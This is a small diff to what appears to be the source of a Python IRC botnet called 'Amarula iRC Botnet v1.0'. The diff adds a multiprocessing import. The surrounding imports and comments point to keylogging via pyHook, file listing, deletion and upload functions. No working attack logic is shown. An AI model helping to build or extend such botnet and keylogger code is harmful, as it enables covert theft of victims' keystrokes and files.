@@ -5,6 +5,7 @@
 # Amarula iRC Botnet v1.0 - Abacatch Version
 
 
+
 #######################################################################################################################
 #                                                                                                                     #
 # -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
@@ -13,6 +14,7 @@
 #######################################################################################################################
 
 import glob                                       # Funcao listArq()
+import multiprocessing                            # funcao main(), keylog()
 import os                                         # Funcoes deleteFile(), listArq(), upload(),
 import platform                                   # Variavel pcName
 import pyHook, pythoncom                          # Funcoes keylog(), onKey(event)
